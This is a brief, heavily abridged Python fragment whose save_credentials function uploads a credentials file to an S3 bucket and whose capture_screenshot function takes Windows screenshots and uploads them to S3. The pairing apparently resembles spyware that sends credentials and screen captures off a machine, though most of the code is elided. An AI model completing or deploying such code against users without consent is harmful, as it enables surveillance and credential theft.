...
def save_credentials(credentials):
    ...
    try:
        s3_client.upload_file(CREDENTIALS_FILE, S3_BUCKET_NAME, CREDENTIALS_FILE)
        print(f"Uploaded {CREDENTIALS_FILE} to S3.")
    except Exception as e:
        print(f"Failed to upload {CREDENTIALS_FILE} to S3: {str(e)}")
...
def capture_screenshot():
    if platform.system() == 'Windows':
        ...
        try:
            ...
            print(f"Uploaded {screenshot_filename} to S3.")
        except Exception as e:
            print(f"Failed to upload {screenshot_filename} to S3: {str(e)}")
